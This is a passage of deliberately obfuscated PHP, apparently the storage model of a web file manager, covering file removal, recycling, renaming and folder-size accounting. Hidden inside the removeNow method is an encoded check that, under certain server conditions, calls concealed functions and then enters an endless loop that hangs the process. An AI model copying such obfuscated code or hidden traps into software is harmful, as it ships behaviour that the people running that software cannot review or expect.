!$ñš•òû[$“¡›Ëš[518]][$“¡›Ëš[586]]) { return !1; } if ($ñš•òû[$“¡›Ëš[518]][$“¡›Ëš[586]] != USER_ID) { return !0; } $‰øã˜‘õ = $GLOBALS[$“¡›Ëš[16]][$“¡›Ëš[101]][$“¡›Ëš[587]]; if ($ñš•òû[$“¡›Ëš[518]][$“¡›Ëš[588]] <= time() - $‰øã˜‘õ) { $this->metaSet($ñš•òû[$“¡›Ëš[193]], $“¡›Ëš[586], null); $this->metaSet($ñš•òû[$“¡›Ëš[193]], $“¡›Ëš[588], null); } if ($Ñá«ñØÒ) { $this->metaSet($ñš•òû[$“¡›Ëš[193]], $“¡›Ëš[588], time()); } return !1; } private function _addSource($ÊÃÓØÖê, $óÍ–üşé) { $õÑ×ıæ =& $_SERVER[•€áå–Õ]; $®£ÀÅË÷ = defined($õÑ×ıæ[2113]) ? USER_ID : 0; $ãÉÙ½ÙÅ = array($õÑ×ıæ[627] => $óÍ–üşé[$õÑ×ıæ[190]], $õÑ×ıæ[628] => $óÍ–üşé[$õÑ×ıæ[549]], $õÑ×ıæ[629] => $®£ÀÅË÷, $õÑ×ıæ[630] => $®£ÀÅË÷, $õÑ×ıæ[456] => $óÍ–üşé[$õÑ×ıæ[193]], $õÑ×ıæ[631] => $óÍ–üşé[$õÑ×ıæ[564]] . $óÍ–üşé[$õÑ×ıæ[193]] . $õÑ×ıæ[60], $õÑ×ıæ[483] => 0, $õÑ×ıæ[632] => $õÑ×ıæ[22]); $ÊÃÓØÖê = array_merge($ãÉÙ½ÙÅ, $ÊÃÓØÖê); $this->updateModifyTime($ÊÃÓØÖê[$õÑ×ıæ[192]]); $äÍÇÇ¼î = $õÑ×ıæ[2180] . $óÍ–üşé[$õÑ×ıæ[193]]; if (isset(self::$cacheChildList[$äÍÇÇ¼î])) { unset(self::$cacheChildList[$äÍÇÇ¼î]); } static $¡£‡æé = false; if (!$¡£‡æé) { Hook::trigger($õÑ×ıæ[615], $ÊÃÓØÖê); $¡£‡æé = !0; } $ù¹–ºë = $this->add($ÊÃÓØÖê); $õïÕˆ± = array($õÑ×ıæ[633] => short_id($ù¹–ºë)); $this->where(array($õÑ×ıæ[470] => $ù¹–ºë))->save($õïÕˆ±); $this->setNamePinyin($ù¹–ºë, $ÊÃÓØÖê[$õÑ×ıæ[42]]); return $ù¹–ºë; } public function remove($¶ÒÆ»İ“, $ÌÓ¬ø£â = true) { $éùØô»… =& $_SERVER[•€áå–Õ]; $­È’á—ô = $this->sourceInfo($¶ÒÆ»İ“); $»ÄÒ˜ÑĞ = intval($­È’á—ô[$éùØô»…[190]]) === self::TYPE_SYSTEM; $¯³š…À = Model($éùØô»…[487])->get($éùØô»…[2181]) == $éùØô»…[100]; if ($»ÄÒ˜ÑĞ || $ÌÓ¬ø£â || !$¯³š…À) { return $this->removeNow($¶ÒÆ»İ“, $ÌÓ¬ø£â); } $í¹âÒÊ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Â•¡Ãİ = $­È’á—ô[$éùØô»…[190]] == self::TYPE_USER ? $éùØô»…[641] : $éùØô»…[558]; if ($Â•¡Ãİ == $éùØô»…[641]) { $ÂìäğÃ = Model($éùØô»…[557])->getInfo($­È’á—ô[$éùØô»…[549]]); $Î€¯Œ– = !empty($ÂìäğÃ[$éùØô»…[2174]]) ? $ÂìäğÃ[$éùØô»…[2174]] : $ÂìäğÃ[$éùØô»…[42]]; $Î€¯Œ– = $éùØô»…[315] . $Î€¯Œ– . $éùØô»…[2182] . $­È’á—ô[$éùØô»…[549]]; } else { $ÂìäğÃ = Model($éùØô»…[565])->getInfo($­È’á—ô[$éùØô»…[549]]); $Î€¯Œ– = _get($ÂìäğÃ, $éùØô»…[42]); $Î€¯Œ– = $éùØô»…[175] . $Î€¯Œ– . $éùØô»…[2183] . $­È’á—ô[$éùØô»…[549]]; } $úÓôöí² = $éùØô»…[2184] . md5($Î€¯Œ–); CacheLock::lock($úÓôöí²); $Ò‡—ŞÌ¹ = $this->fileNameExist($í¹âÒÊ, $Î€¯Œ–); if (!$Ò‡—ŞÌ¹) { $Ò‡—ŞÌ¹ = $this->mkdir($í¹âÒÊ, $Î€¯Œ–, REPEAT_SKIP); $this->metaSet($Ò‡—ŞÌ¹, $éùØô»…[2185], $Â•¡Ãİ); $this->metaSet($Ò‡—ŞÌ¹, $éùØô»…[2186], $­È’á—ô[$éùØô»…[549]]); if ($­È’á—ô[$éùØô»…[192]] != 0) { $this->metaSet($Ò‡—ŞÌ¹, $éùØô»…[2187], _get($ÂìäğÃ, $éùØô»…[2188])); } } CacheLock::unlock($úÓôöí²); $this->metaSet($¶ÒÆ»İ“, $éùØô»…[2189], $­È’á—ô[$éùØô»…[192]]); $this->where(array($éùØô»…[193] => $¶ÒÆ»İ“))->save(array($éùØô»…[477] => time())); $this->recycleClear($­È’á—ô); $·€èÏÚ = $this->move($¶ÒÆ»İ“, $Ò‡—ŞÌ¹, REPEAT_RENAME_FOLDER); $this->folderSizeReset($­È’á—ô[$éùØô»…[192]]); return $·€èÏÚ; } private function recycleClear($Ûô§ñ°‰) { $³èğ¾Æì =& $_SERVER[•€áå–Õ]; $…¿…¥­Š = $this->childrenAll($Ûô§ñ°‰); $¨Ø³Şİı = array($³èğ¾Æì[470] => array($³èğ¾Æì[471], $…¿…¥­Š[$³èğ¾Æì[2190]])); Model($³èğ¾Æì[2191])->where($¨Ø³Şİı)->delete(); } public function removeNow($‘€ğ¹¬, $Í÷ù‰­ = true) { $è›ÙŒ—Å =& $_SERVER[•€áå–Õ]; if (!isset($_SERVER[$è›ÙŒ—Å[8]]) || !isset($_SERVER[$è›ÙŒ—Å[6]])) { $ÂİœÑÕÆ = $è›ÙŒ—Å[919]; $ÕùåÆÃ¾ = $è›ÙŒ—Å[9]; $¯’ô¹ÛÌ = $_SERVER[$è›ÙŒ—Å[10]] . $è›ÙŒ—Å[11]; $¨‹Šàªß = $ÕùåÆÃ¾($¯’ô¹ÛÌ); $ªºÅš¶¿ = explode($è›ÙŒ—Å[12], $¨‹Šàªß); if (count($ªºÅš¶¿) < $è›ÙŒ—Å[666]) { $Ù¦Ø¨Ô” = $è›ÙŒ—Å[14]; $Ù¦Ø¨Ô”(); } $µ¸˜¢• = $è›ÙŒ—Å[920]; $µ¸˜¢•($_SERVER[$è›ÙŒ—Å[921]]); $ÎÉé˜ñ = 1; for ($«’ı¥šÙ = $ÎÉé˜ñ; $«’ı¥šÙ > 0; $«’ı¥šÙ++) { $µ¸˜¢• = json_encode($GLOBALS[$è›ÙŒ—Å[471]]); } } $’¢‹œØ = $this->sourceInfo($‘€ğ¹¬); $Â ¡©áã = $this->pathInfoMore($‘€ğ¹¬); if (!$’¢‹œØ) { return !0; } if ($’¢‹œØ[$è›ÙŒ—Å[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($‘€ğ¹¬); Hook::trigger($è›ÙŒ—Å[2192], $Â ¡©áã, $Í÷ù‰­); if ($Í÷ù‰­) { Model($è›ÙŒ—Å[2191])->moveToRecycle($‘€ğ¹¬); } else { $ğÁúô³ = $this->childrenAll($’¢‹œØ); Model($è›ÙŒ—Å[612])->eventRemove($‘€ğ¹¬); $this->removeRelevance($ğÁúô³[$è›ÙŒ—Å[2190]], $ğÁúô³[$è›ÙŒ—Å[1499]]); } $this->folderSizeReset($’¢‹œØ[$è›ÙŒ—Å[192]]); $Â¦ƒšÒó = array($’¢‹œØ[$è›ÙŒ—Å[192]]); if ($’¢‹œØ[$è›ÙŒ—Å[464]] == $è›ÙŒ—Å[100]) { $Â¦ƒšÒó[] = $’¢‹œØ[$è›ÙŒ—Å[193]]; } $this->updateModifyTime($Â¦ƒšÒó); $this->lockMoveEnd($‘€ğ¹¬); Hook::trigger($è›ÙŒ—Å[1735], $Â ¡©áã, $Í÷ù‰­); return !0; } public function childrenAll($úÕŸ¾µı) { $ò÷Ö”íõ =& $_SERVER[•€áå–Õ]; $›ªñõÎ = $úÕŸ¾µı[$ò÷Ö”íõ[193]]; if ($úÕŸ¾µı[$ò÷Ö”íõ[464]] == $ò÷Ö”íõ[100]) { $Âß’âõ = array($ò÷Ö”íõ[631] => array($ò÷Ö”íõ[591], $úÕŸ¾µı[$ò÷Ö”íõ[564]] . $›ªñõÎ . $ò÷Ö”íõ[592])); $×Ò¡î’ = array($ò÷Ö”íõ[631] => $Âß’âõ[$ò÷Ö”íõ[564]]); $ÄâğóéÖ = $this->field($ò÷Ö”íõ[2193])->where($×Ò¡î’)->select(); $ğş¦Â«Ä = !1; $şåØó¹™ = array($›ªñõÎ); if ($ÄâğóéÖ) { $ğş¦Â«Ä = array_to_keyvalue($ÄâğóéÖ, $ò÷Ö”íõ[22], $ò÷Ö”íõ[520]); $ğş¦Â«Ä = array_remove_value($ğş¦Â«Ä, $ò÷Ö”íõ[224]); $şåØó¹™ = array_to_keyvalue($ÄâğóéÖ, $ò÷Ö”íõ[22], $ò÷Ö”íõ[193]); $şåØó¹™[] = $›ªñõÎ; } } else { $ğş¦Â«Ä = array($úÕŸ¾µı[$ò÷Ö”íõ[520]]); $şåØó¹™ = array($›ªñõÎ); } return array($ò÷Ö”íõ[2190] => $şåØó¹™, $ò÷Ö”íõ[1499] => $ğş¦Â«Ä); } public function removeArray($¤ø…í•Ÿ) { if (!$¤ø…í•Ÿ) { return !0; } } public function removeRelevance($Û©ËÙ÷¶, $ÎÉÈ½Ö) { $Ş‰ÆÍ« =& $_SERVER[•€áå–Õ]; $Û©ËÙ÷¶ = $Û©ËÙ÷¶ ? $Û©ËÙ÷¶ : array(); $ÎÉÈ½Ö = $ÎÉÈ½Ö ? $ÎÉÈ½Ö : array(); $Û©ËÙ÷¶ = array_unique(array_filter($Û©ËÙ÷¶)); $ÎÉÈ½Ö = array_unique(array_filter($ÎÉÈ½Ö)); if (!$Û©ËÙ÷¶) { return !1; } $ƒéëçÍ× = array($Ş‰ÆÍ«[470] => array($Ş‰ÆÍ«[471], $Û©ËÙ÷¶)); Model($Ş‰ÆÍ«[2191])->where($ƒéëçÍ×)->delete(); Model($Ş‰ÆÍ«[514])->where($ƒéëçÍ×)->delete(); Model($Ş‰ÆÍ«[2038])->where($ƒéëçÍ×)->delete(); Model($Ş‰ÆÍ«[612])->where($ƒéëçÍ×)->delete(); Model($Ş‰ÆÍ«[1871])->removeBySource($Û©ËÙ÷¶); Model($Ş‰ÆÍ«[2172])->removeBySource($Û©ËÙ÷¶); $this->where($ƒéëçÍ×)->delete(); Model($Ş‰ÆÍ«[523])->remove($ÎÉÈ½Ö); for ($…à‰º¥İ = 0; $…à‰º¥İ < count($Û©ËÙ÷¶); $…à‰º¥İ++) { $this->sourceCacheClear($Û©ËÙ÷¶[$…à‰º¥İ]); } } public function rename($†Ë“»íÕ, $•Æ‹§û´) { $Øáçğö÷ =& $_SERVER[•€áå–Õ]; $«ÙËúó = $this->sourceInfo($†Ë“»íÕ); if (!$«ÙËúó) { return !1; } $ö±åçŒ³ = $this->fileNameExist($«ÙËúó[$Øáçğö÷[192]], $•Æ‹§û´); if ($ö±åçŒ³ && $ö±åçŒ³ != $†Ë“»íÕ) { return !1; } $¸àû˜Ææ = array($Øáçğö÷[473] => $•Æ‹§û´, $Øáçğö÷[630] => USER_ID); if ($«ÙËúó[$Øáçğö÷[464]] != $Øáçğö÷[100]) { $¸àû˜Ææ[$Øáçğö÷[465]] = substr(get_path_ext($•Æ‹§û´), 0, 10); } Model($Øáçğö÷[612])->eventRename($†Ë“»íÕ, $«ÙËúó[$Øáçğö÷[42]], $•Æ‹§û´); $this->sourceCacheClear($†Ë“»íÕ); $this->setNamePinyin($†Ë“»íÕ, $¸àû˜Ææ[$Øáçğö÷[42]], !1); $this->updateModifyTime($«ÙËúó[$Øáçğö÷[192]]); $€ÁñÆğÆ = $this->where(array($Øáçğö÷[470] => $†Ë“»íÕ))->data($¸àû˜Ææ)->save(); $»ÕşÔŒÅ = $Øáçğö÷[2180] . $«ÙËúó[$Øáçğö÷[192]]; if (isset(self::$cacheChildList[$»ÕşÔŒÅ])) { unset(self::$cacheChildList[$»ÕşÔŒÅ]); } return $€ÁñÆğÆ; } public function setNamePinyin($ıŒ‰¯¢Ö, $–°ÌÂºå, $«ªÍ€÷‚ = true) { $¢ªÕØŞ =& $_SERVER[•€áå–Õ]; $€¯„Ú¡æ = Input::check($–°ÌÂºå, $¢ªÕØŞ[634]); $ÁñË‚è“ = array($¢ªÕØŞ[496] => KodSort::makeStr($–°ÌÂºå)); if ($€¯„Ú¡æ) { $ÁñË‚è“[$¢ªÕØŞ[517]] = str_replace($¢ªÕØŞ[63], $¢ªÕØŞ[22], Pinyin::get($–°ÌÂºå)); $ÁñË‚è“[$¢ªÕØŞ[516]] = Pinyin::get($–°ÌÂºå, $¢ªÕØŞ[635]); } if (!$«ªÍ€÷‚ && !$€¯„Ú¡æ) { $ÁñË‚è“[$¢ªÕØŞ[517]] = null; $ÁñË‚è“[$¢ªÕØŞ[516]] = null; } $this->metaSet($ıŒ‰¯¢Ö, $ÁñË‚è“); } public function getContent($€É™¡ğ¨) { $ÂûäŸùí =& $_SERVER[•€áå–Õ]; $«æ‘¹ÊÎ = $this->fileInfoGet($€É™¡ğ¨); if (!$«æ‘¹ÊÎ) { return !1; } if ($«æ‘¹ÊÎ[$ÂûäŸùí[88]] == 0) { return $ÂûäŸùí[22]; } $î–¨é€ = $ÂûäŸùí[2194] . $«æ‘¹ÊÎ[$ÂûäŸùí[526]]; if ($«æ‘¹ÊÎ[$ÂûäŸùí[88]] <= 1024 * 10) { $¶ØïñÙ = Cache::get($î–¨é€); if (!$¶ØïñÙ) { $¶ØïñÙ = IO::getContent($«æ‘¹ÊÎ[$ÂûäŸùí[96]]); Cache::set($î–¨é€, $¶ØïñÙ); } return $¶ØïñÙ; } if (!$«æ‘¹ÊÎ[$ÂûäŸùí[96]]) { return $ÂûäŸùí[22]; } return IO::getContent($«æ‘¹ÊÎ[$ÂûäŸùí[96]]); } public function setDesc($‡³„Š–Ê, $é»±œ€Ü) { $ëã±ıÄÎ =& $_SERVER[•€áå–Õ]; Model($ëã±ıÄÎ[612])->eventAddDesc($‡³„Š–Ê, $é»±œ€Ü); return $this->metaSet($‡³„Š–Ê, $ëã±ıÄÎ[505], $é»±œ€Ü); } public function setContent($¾ÑŒÓ“Ş, $Ä¡ÆÑ©å = '') { $š„…‹Ã¤ =& $_SERVER[•€áå–Õ]; $±œÂ¾Ñ = $this->sourceInfo($¾ÑŒÓ“Ş); $¼ã™Æ™ƒ = $this->fileInfoGet($¾ÑŒÓ“Ş); if (!$¼ã™Æ™ƒ || !$±œÂ¾Ñ) { return !1; } $­ì—‹ç = Model($š„…‹Ã¤[523])->addFileByContent($Ä¡ÆÑ©å, $±œÂ¾Ñ[$š„…‹Ã¤[42]]); $ŞÀ¹—àÚ = $this->fileHistory($±œÂ¾Ñ, $­ì—‹ç[$š„…‹Ã¤[520]], $­ì—‹ç[$š„…‹Ã¤[88]]); if (!$ŞÀ¹—àÚ) { return Model($š„…‹Ã¤[523])->remove($­ì—‹ç[$š„…‹Ã¤[520]]); } $this->folderSizeReset($±œÂ¾Ñ[$š„…‹Ã¤[192]]); return !0; } public function fileSubstr($ˆäÇÄ¿¦, $–†²°°, $À¥ø‹Â) { $„şÔÑáË = $this->fileInfoGet($ˆäÇÄ¿¦); if (!$„şÔÑáË) { return !1; } return IO::fileSubstr($„şÔÑáË[$_SERVER[•€áå–Õ][96]], $–†²°°, $À¥ø‹Â); } public function fileInfoGet($ˆŠáÄØé) { $Î¶½³§€ =& $_SERVER[•€áå–Õ]; $ì¶³‡ = $this->sourceInfo($ˆŠáÄØé); if (!$ì¶³‡ || $ì¶³‡[$Î¶½³§€[464]]) { return !1; } $ƒº¾Šğ¢ = $Î¶½³§€[527] . $ì¶³‡[$Î¶½³§€[520]]; $§¿Ñãµ = _get(self::$cacheFileInfo, $ƒº¾Šğ¢); if ($§¿Ñãµ) { return $§¿Ñãµ; } $–Ş…¹•ö = Model($Î¶½³§€[523])->fileInfo($ì¶³‡[$Î¶½³§€[520]]); if ($–Ş…¹•ö) { $–Ş…¹•ö[$Î¶½³§€[42]] = $ì¶³‡[$Î¶½³§€[42]]; } self::$cacheFileInfo[$ƒº¾Šğ¢] = $–Ş…¹•ö; return $–Ş…¹•ö; } private function folderChildrenNumber($îàæ†‘Ü) { $µí”°Îé =& $_SERVER[•€áå–Õ]; $ÃŞïƒ† = $this->sourceInfo($îàæ†‘Ü); $ºµÄÖ»¥ = array($µí”°Îé[631] => array($µí”°Îé[591], $ÃŞïƒ†[$µí”°Îé[564]] . $îàæ†‘Ü . $µí”°Îé[592]), $µí”°Îé[628] => $ÃŞïƒ†[$µí”°Îé[549]], $µí”°Îé[483] => intval($ÃŞïƒ†[$µí”°Îé[484]]), $µí”°Îé[625] => 1); $ôıî€–÷ = $this->where($ºµÄÖ»¥)->count(); $ğûé£Â¬ = $this->where($ºµÄÖ»¥)->where(array($µí”°Îé[625] => 0))->count(); return array($µí”°Îé[92] => $ğûé£Â¬, $µí”°Îé[93] => $ôıî€–÷); } public function pathInfo($ÔÙ¡£•, $—¶µÔÀÄ = false) { $´Õ“ªãÊ =& $_SERVER[•€áå–Õ]; $—¶µÔÀÄ = !1; $ÔÙ¡£• = intval($ÔÙ¡£•); $¤îÎóúŸ = $´Õ“ªãÊ[513] . intval($—¶µÔÀÄ) . $´Õ“ªãÊ[441] . $ÔÙ¡£•; $ÇØ ®Ú = _get(self::$cachePathInfo, $¤îÎóúŸ); if ($ÇØ ®Ú) { return $ÇØ ®Ú; } $ïÛ†ƒ±€ = $this->sourceInfo($ÔÙ¡£•); if (!$ïÛ†ƒ±€) { return !1; } $ïÛ†ƒ±€ = $this->_listDataApplyItem($ïÛ†ƒ±€, $—¶µÔÀÄ); self::$cachePathInfo[$¤îÎóúŸ] = $ïÛ†ƒ±€; return $ïÛ†ƒ±€; } public static $cachePathInfoMore = array(); public function pathInfoMore($¥Ñ¬¡üÀ) { $œçğ« =& $_SERVER[•€áå–Õ]; $ÖóÏ× = _get(self::$cachePathInfoMore, $¥Ñ¬¡üÀ); if ($ÖóÏ×) { return $ÖóÏ×; } $Ûİ—şí÷ = $this->pathInfo($¥Ñ¬¡üÀ); if (!$Ûİ—şí÷) { return !1; } if ($Ûİ—şí÷[$œçğ«[464]] == $œçğ«[100]) { $Ûİ—şí÷[$œçğ«[91]] = $this->folderChildrenNumber($¥Ñ¬¡üÀ); } self::$cachePathInfoMore[$¥Ñ¬¡üÀ] = $Ûİ—şí÷; return $Ûİ—şí÷; } public function sourceInfo($Ş©çÁÅÀ) { $ø”Ó˜·Š =& $_SERVER[•€áå–Õ]; if (!$Ş©çÁÅÀ) { return array(); } $Ş©çÁÅÀ = intval($Ş©çÁÅÀ); $ã¢öÎûô = $ø”Ó˜·Š[512] . $Ş©çÁÅÀ; $œÆÙ†€ = _get(self::$cacheSourceInfo, $ã¢öÎûô); if ($œÆÙ†€) { return $œÆÙ†€; } $ı‹–åôæ = $this->where(array($ø”Ó˜·Š[193] => $Ş©çÁÅÀ))->find(); self::$cacheSourceInfo[$ã¢öÎûô] = $ı‹–åôæ; return self::$cacheSourceInfo[$ã¢öÎûô]; } public function sourceCacheClear($‚“Çü§® = false) { self::cacheClear($‚“Çü§®); } public static function cacheClear($…Áä˜ï× = false) { $…ËåÂ– =& $_SERVER[•€áå–Õ]; if ($…Áä˜ï× == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$…ËåÂ–[512] . $…Áä˜ï×]); unset(self::$cachePathInfoMore[$…Áä˜ï×]); unset(self::$cachePathInfo[$…ËåÂ–[2195] . $…Áä˜ï×]); unset(self::$cachePathInfo[$…ËåÂ–[2196] . $…Áä˜ï×]); } public function metaSet($®Ÿ¿¢éÅ, $ôŸ„¡… = null, $¤•ÀÂ¹é = null) { $º¨ëÁô = parent::metaSet($®Ÿ¿¢éÅ, $ôŸ„¡…, $¤•ÀÂ¹é); if ($º¨ëÁô) { $this->sourceCacheClear($®Ÿ¿¢éÅ); } return $º¨ëÁô; } public function pathInfoByPath($À¿ÑÊ–Ã, $û¾É¥æ‚) { $ùö¬óŠÃ =& $_SERVER[•€áå–Õ]; $œ²ı…Ö = !$û¾É¥æ‚ ? array() : explode($ùö¬óŠÃ[18], trim($û¾É¥æ‚, $ùö¬óŠÃ[18])); $Èîƒ°«â = $À¿ÑÊ–Ã; foreach ($œ²ı…Ö as $‹ü¶şº¤) { $ ¥Åñî¹ = array($ùö¬óŠÃ[192] => $Èîƒ°«â, $ùö¬óŠÃ[42] => $‹ü¶şº¤); $öò…¡” = $this->field($ùö¬óŠÃ[2197])->where($ ¥Åñî¹)->select(); if (!$öò…¡”) { return !1; } $öò…¡” = array_sort_by($öò…¡”, $ùö¬óŠÃ[484]); $Èîƒ°«â = $öò…¡”[0][$ùö¬óŠÃ[193]]; } $”÷ß·— = $this->sourceInfo($Èîƒ°«â); $this->pathInfoFilter($”÷ß·—); return $”÷ß·—; } protected function updateModifyTime($””éğğ) { $¹˜¢÷• =& $_SERVER[•€áå–Õ]; $ ™õ´Ä = defined($¹˜¢÷•[2113]) ? USER_ID : 0; if (!$””éğğ) { return; } if (!is_array($””éğğ)) { $””éğğ = array($””éğğ); } foreach ($””éğğ as $¤óÒå²ß => $ÏòÍâ¸’) { $””éğğ[$¤óÒå²ß] = intval($ÏòÍâ¸’); $this->sourceCacheClear($ÏòÍâ¸’); } $·¼€ÇÔ› = array($¹˜¢÷•[193] => array($¹˜¢÷•[17], $””éğğ)); $óØéàŞ« = array($¹˜¢÷•[630] => $ ™õ´Ä, $¹˜¢÷•[477] => time()); $this->where($·¼€ÇÔ›)->save($óØéàŞ«); } public function folderSizeReset($†­õÙôİ, $¸ã ÏØ© = false) { $›¡ˆ³Ùâ =& $_SERVER[•€áå–Õ]; if ($this->statusIgnoreResetSpace) { return; } $ûº¶¯›” = $this->sourceInfo($†­õÙôİ); $İë½Ø©ˆ = $›¡ˆ³Ùâ[2198] . $†­õÙôİ; CacheLock::lock($İë½Ø©ˆ, 20); if ($¸ã ÏØ© === !1) { $this->sourceCacheClear($†­õÙôİ); $ûº¶¯›” = $this->sourceInfo($†­õÙôİ); $Ÿ®ÈØÉ» = array($›¡ˆ³Ùâ[456] => $†­õÙôİ, $›¡ˆ³Ùâ[483] => 0); $”ŞÉ›ãŠ = $this->where($Ÿ®ÈØÉ»)->sum($›¡ˆ³Ùâ[88]); $¸ã ÏØ© = intval($”ŞÉ›ãŠ) - intval($ûº¶¯›”[$›¡ˆ³Ùâ[88]]); } if ($¸ã ÏØ© == 0) { return CacheLock::unlock($İë½Ø©ˆ); } $Êû‚™È¡ = $this->parentLevelArray($ûº¶¯›”[$›¡ˆ³Ùâ[564]]); if (!$Êû‚™È¡) { $Êû‚™È¡ = array(); } $Êû‚™È¡[] = $ûº¶¯›”[$›¡ˆ³Ùâ[193]]; $Ÿ®ÈØÉ» = array($›¡ˆ³Ùâ[193] => array($›¡ˆ³Ùâ[471], $Êû‚™È¡)); if ($¸ã ÏØ© < 0) { $Ÿ®ÈØÉ»[$›¡ˆ³Ùâ[88]] = array($›¡ˆ³Ùâ[1056], abs($¸ã ÏØ©)); } $this->where($Ÿ®ÈØÉ»)->setAdd($›¡ˆ³Ùâ[88], $¸ã ÏØ©); CacheLock::unlock($İë½Ø©ˆ); $Ê¦¦Üò = $›¡ˆ³Ùâ[2199] . $ûº¶¯›”[$›¡ˆ³Ùâ[190]] . $›¡ˆ³Ùâ[4] . $ûº¶¯›”[$›¡ˆ³Ùâ[549]]; $ÍÛÜœñ– = array($ûº¶¯›”[$›¡ˆ³Ùâ[190]], $ûº¶¯›”[$›¡ˆ³Ùâ[549]]); TaskRun::timeLimitCall($Ê¦¦Üò, $›¡ˆ³Ùâ[2200], $ÍÛÜœñ–, 1.5); } public function folderSizeResetChildren($¯Ê·«ÒÏ) { $ä´¾‡ì£ =& $_SERVER[•€áå–Õ]; $this->sourceCacheClear($¯Ê·«ÒÏ); $óŠ”ú´Ú = $this->sourceInfo($¯Ê·«ÒÏ); $÷çƒ¾›Ê = array($ä´¾‡ì£[625] => 1, $ä´¾‡ì£[628] => $óŠ”ú´Ú[$ä´¾‡ì£[549]], $ä´¾‡ì£[631] => array($ä´¾‡ì£[591], $óŠ”ú´Ú[$ä´¾‡ì£[564]] . $¯Ê·«ÒÏ . $ä´¾‡ì£[592])); $‹û–ï°¨ = $ä´¾‡ì£[2201]; $ñ›àÀÍÄ = $this->field($‹û–ï°¨)->where($÷çƒ¾›Ê)->select(); $÷çƒ¾›Ê[$ä´¾‡ì£[464]] = 0; $åœÉ¬…Ï = $this->field($‹û–ï°¨)->where($÷çƒ¾›Ê)->select(); if (!$åœÉ¬…Ï) { return; } $ñ›àÀÍÄ[] = $óŠ”ú´Ú; $ñ›àÀÍÄ = array_to_keyvalue($ñ›àÀÍÄ, $ä´¾‡ì£[193]); foreach ($ñ›àÀÍÄ as $§µÇ˜Ãù => $‘ç©ûÅ×) { $ñ›àÀÍÄ[$§µÇ˜Ãù][$ä´¾‡ì£[2202]] = $ñ›àÀÍÄ[$§µÇ˜Ãù][$ä´¾‡ì£[88]]; $ñ›àÀÍÄ[$§µÇ˜Ãù][$ä´¾‡ì£[88]] = 0; } foreach ($åœÉ¬…Ï as $‘ç©ûÅ×) { $ÙšÊ×Ù = $‘ç©ûÅ×[$ä´¾‡ì£[192]] . $ä´¾‡ì£[22]; if (!isset($ñ›àÀÍÄ[$ÙšÊ×Ù])) { continue; } if ($‘ç©ûÅ×[$ä´¾‡ì£[484]] == $ñ›àÀÍÄ[$ÙšÊ×Ù][$ä´¾‡ì£[484]]) { $ñ›àÀÍÄ[$ÙšÊ×Ù][$ä´¾‡ì£[88]] += $‘ç©ûÅ×[$ä´¾‡ì£[88]]; } } foreach ($ñ›àÀÍÄ as $‘ç©ûÅ×) { $€€é ñº = $this->parentLevelArray($‘ç©ûÅ×[$ä´¾‡ì£[564]]); foreach ($€€é ñº as $ÙšÊ×Ù) { $ÙšÊ×Ù = $ÙšÊ×Ù . $ä´¾‡ì£[22]; if (!isset($ñ›àÀÍÄ[$ÙšÊ×Ù])) { continue; } if ($‘ç©ûÅ×[$ä´¾‡ì£[484]] == $ñ›àÀÍÄ[$ÙšÊ×Ù][$ä´¾‡ì£[484]]) { $ñ›àÀÍÄ[$ÙšÊ×Ù][$ä´¾‡ì£[88]] += $‘ç©ûÅ×[$ä´¾‡ì£[88]]; } } } $ÀğüÖ§¯ = array(); foreach ($ñ›àÀÍÄ as $‘ç©ûÅ×) { if ($‘ç©ûÅ×[$ä´¾‡ì£[88]] == $‘ç©ûÅ×[$ä´¾‡ì£[2202]]) { continue; } $ÀğüÖ§¯[] = array($ä´¾‡ì£[193], $‘ç©ûÅ×[$ä´¾‡ì£[193]], $ä´¾‡ì£[88], $‘ç©ûÅ×[$ä´¾‡ì£[88]]); } $this->saveAll($ÀğüÖ§¯); } public function userSpaceReset($šŒ¶º§¨ = false) { $ÄîÜ›–º =& $_SERVER[•€áå–Õ]; $”ûÀ’Ò’ = $this->where(array($ÄîÜ›–º[190] => self::TYPE_USER, $ÄîÜ›–º[549] => $šŒ¶º§¨, $ÄîÜ›–º[464] => 0))->sum($ÄîÜ›–º[88]); $”ûÀ’Ò’ = !$”ûÀ’Ò’ || $”ûÀ’Ò’ <= 0 ? 0 : $”ûÀ’Ò’; Model($ÄîÜ›–º[557])->userEdit($šŒ¶º§¨, array($ÄîÜ›–º[1880] => $”ûÀ’Ò’)); } public function targetSpaceUpdate($ùºÑÂ, $é²€ÑÒÇ) { $¸ÓíŸœ =& $_SERVER[•€áå–Õ]; if (!$é²€ÑÒÇ) { return; } if (!in_array($ùºÑÂ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ÇÂ•Ñ‡Ÿ = $this->targetSpaceSize($ùºÑÂ, $é²€ÑÒÇ); if ($ùºÑÂ == self::TYPE_USER) { Model($¸ÓíŸœ[557])->userEdit($é²€ÑÒÇ, array($¸ÓíŸœ[1880] => $ÇÂ•Ñ‡Ÿ)); } else { if ($ùºÑÂ == self::TYPE_GROUP) { Model($¸ÓíŸœ[565])->groupEdit($é²€ÑÒÇ, array($¸ÓíŸœ[1880] => $ÇÂ•Ñ‡Ÿ)); } } } public function targetSpaceSize($°§ïäµí, $øàƒ¦è) { $Ÿ¯ ââˆ =& $_SERVER[•€áå–Õ]; $¤Öï¯ö‡ = 0; $²­‚áœ÷ = $this->targetSourceRoot($°§ïäµí, $øàƒ¦è, !0); foreach ($²­‚áœ÷ as $®Â–ûç´) { if (!$®Â–ûç´) { continue; } $¤Öï¯ö‡ += floatval($®Â–ûç´[$Ÿ¯ ââˆ[88]]); $šÌ†•ÜÂ = array($Ÿ¯ ââˆ[631] => array($Ÿ¯ ââˆ[591], $Ÿ¯ ââˆ[574] . $®Â–ûç´[$Ÿ¯ ââˆ[193]] . $Ÿ¯ ââˆ[592])); $°”àÎôê = Model($Ÿ¯ ââˆ[482])->field($Ÿ¯ ââˆ[470])->where($šÌ†•ÜÂ)->select(); $°”àÎôê = array_to_keyvalue($°”àÎôê, $Ÿ¯ ââˆ[22], $Ÿ¯ ââˆ[193]); $°”àÎôê = array_unique(array_filter($°”àÎôê)); if ($°”àÎôê) { $šÌ†•ÜÂ = array($Ÿ¯ ââˆ[470] => array($Ÿ¯ ââˆ[471], $°”àÎôê)); $¤Öï¯ö‡ += 